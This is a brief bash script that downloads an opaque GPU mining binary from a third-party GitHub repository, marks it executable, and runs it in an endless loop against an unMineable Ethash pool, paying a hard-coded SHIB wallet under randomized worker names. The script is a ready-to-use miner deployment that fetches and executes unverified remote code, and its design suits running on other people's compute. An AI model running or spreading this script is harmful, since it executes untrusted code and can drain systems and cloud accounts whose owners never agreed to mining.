#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=SHIB:0x663e23e815ff1720b42e223f757fb245d97fbc41
WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#im8m-ybvt)
wget https://github.com/skullCANDe/hick/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
